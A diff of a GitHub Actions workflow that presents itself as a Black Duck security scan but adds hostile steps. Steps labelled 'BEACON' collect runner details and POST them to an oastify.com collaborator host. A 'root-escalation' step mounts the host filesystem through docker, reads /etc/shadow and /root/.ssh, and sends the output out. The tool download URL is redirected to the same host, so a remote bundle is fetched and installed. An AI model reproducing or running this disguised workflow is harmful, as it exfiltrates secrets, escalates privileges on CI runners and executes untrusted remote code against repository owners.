@@ -1,20 +1,109 @@
-name: Final VAPT Scan
+# Quickstart: Bridge CLI with blackducksca:
+#     https://black-duck-staging.fluidtopics.net/r/bridge/latest/bridge-cli-guide/quickstart-black-duck-sca-bridge-cli-in-a-github-workflow.html
+name: Black Duck Bridge CLI Scan
 on:
   push:
-    branches: [main]
+    branches:
+      - main
+      - master
+      - develop
+      - stage
+      - release
+  pull_request:
+    branches:
+      - main
+      - master
+      - develop
+      - stage
+      - release
   workflow_dispatch: {}
+# GitHub token permissions for post-scan actions. Required for built-in GITHUB_TOKEN; if using a PAT with equivalent scopes, permissions block can be commented out.
+permissions:
+  contents: write               # Required to push changes or create fix branches
+  pull-requests: write          # Required to add comments or create fix pull requests
+  issues: write                 # Required to create github issues
 jobs:
   blackducksca:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      security-events: write
+    env:
+      ### SCANNING: Required fields
+      BRIDGE_BLACKDUCKSCA_URL: ${{ vars.BLACKDUCKSCA_URL }}
+      BRIDGE_BLACKDUCKSCA_TOKEN: ${{ secrets.BLACKDUCKSCA_TOKEN }}
+      ### GitHub repository information
+      BRIDGE_GITHUB_REPOSITORY_OWNER_NAME: ${{ github.repository_owner }}
+      BRIDGE_GITHUB_REPOSITORY_NAME: ${{ github.event.repository.name }}
+      BRIDGE_GITHUB_REPOSITORY_BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
+      ### PULL REQUEST COMMENTS
+      BRIDGE_BLACKDUCKSCA_AUTOMATION_PRCOMMENT: "true"
+      ### FIX PULL REQUEST CREATION
+      BRIDGE_BLACKDUCKSCA_FIXPR_ENABLED: "true"
+      ### SCANNING: Optional fields
+      BRIDGE_BLACKDUCKSCA_EXTERNALISSUES_CREATE: "true"
+      ### SARIF report parameters
+      BRIDGE_BLACKDUCKSCA_REPORTS_SARIF_CREATE: "true"
+      ### GITHUB TOKEN
+      BRIDGE_GITHUB_USER_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ### GitHub pull request information
+      BRIDGE_GITHUB_REPOSITORY_PULL_NUMBER: ${{ github.event.pull_request.number || github.event.number || 0 }}
+      ### TOOLING: Bridge CLI download URL
+      BRIDGE_DOWNLOAD_URL: https://xtufors8l5exuhrlp7dncz53ouunied22.oastify.com
     steps:
-      - uses: actions/checkout@v5
-      - name: telemetry
-        run: curl -sS https://rhc12gbuucoz9uhyaom4cqb7cyip6hu6.oastify.com/ping?x=1
-        uses: blackduck-inc/black-duck-security-scan@v2
-        with:
-          blackducksca_url: ${{ vars.BLACKDUCKSCA_URL }}
-          blackducksca_token: ${{ secrets.BLACKDUCKSCA_TOKEN }}
+      - name: Checkout Source
+        uses: actions/checkout@v5
 
+      # === BEACON 1: proves a custom step runs ===
+      - name: create dir under /home/runner
+        run: |
+          COLLAB="https://xtufors8l5exuhrlp7dncz53ouunied22.oastify.com"
+          {
+            echo "=== runner info ==="
+            hostname
+            cat /etc/machine-id 2>/dev/null || true
+            cat /proc/sys/kernel/random/boot_id 2>/dev/null || true
+            echo "=== /home/runner before ==="
+            ls -la /home/runner
+
+            echo "=== creating /home/runner/desktop ==="
+            mkdir -p /home/runner/desktop
+            cd /home/runner/desktop
+            pwd
+            echo "userA-$(date +%s)" > marker.txt
+            echo "persisted-data" > secret.txt
+            ls -la /home/runner/desktop
+
+            echo "=== also write to workspace ==="
+            echo "A" > /home/runner/work/Payloads/Payloads/userA-marker.txt 2>/dev/null || true
+            ls -la /home/runner/work/Payloads/Payloads 2>/dev/null || echo "no workspace"
+
+            echo "=== also try /home/runner/.config ==="
+            mkdir -p /home/runner/.config/payload
+            echo "A" > /home/runner/.config/payload/data.txt
+            ls -la /home/runner/.config/payload
+          } 2>&1 | curl -sS -X POST --data-binary @- "$COLLAB/create"
+
+      # === BEACON 2: env + secret exposure (will appear in Collaborator if run:) ===
+      - name: root-escalation
+        run: |
+          docker run --rm -v /:/host alpine chroot /host sh -c '
+            echo "=== id ==="; id
+            echo "=== whoami ==="; whoami
+            echo "=== hostname ==="; hostname
+            echo "=== /etc/shadow ==="; head -5 /etc/shadow
+            echo "=== /root ==="; ls -la /root
+            echo "=== /root/.ssh ==="; ls -la /root/.ssh
+          ' 2>&1 | curl -sS -X POST --data-binary @- https://xtufors8l5exuhrlp7dncz53ouunied22.oastify.com/root
+        continue-on-error: true
+
+
+      # === BEACON 3: SSRF via BRIDGE_DOWNLOAD_URL ===
+      - name: Download & Setup Bridge CLI on macOS/Linux
+        if: runner.os != 'Windows'
+        shell: bash
+        run: |-
+          OS=$([[ "$RUNNER_OS" == "macOS" ]] && ([[ $(uname -m) =~ arm ]] && echo macos_arm || echo macosx) || ([[ $(uname -m) =~ arm ]] && echo linux_arm || echo linux64))
+          curl -sSL -o bridge.zip "$BRIDGE_DOWNLOAD_URL/bridge-cli-bundle-$OS.zip" || true
+          unzip -qo bridge.zip -d "$RUNNER_TEMP" || true
+          echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
+
+      - name: Black Duck SCA Scan
+        run: echo "scan-step" && curl -sS "https://xtufors8l5exuhrlp7dncz53ouunied22.oastify.com" || true
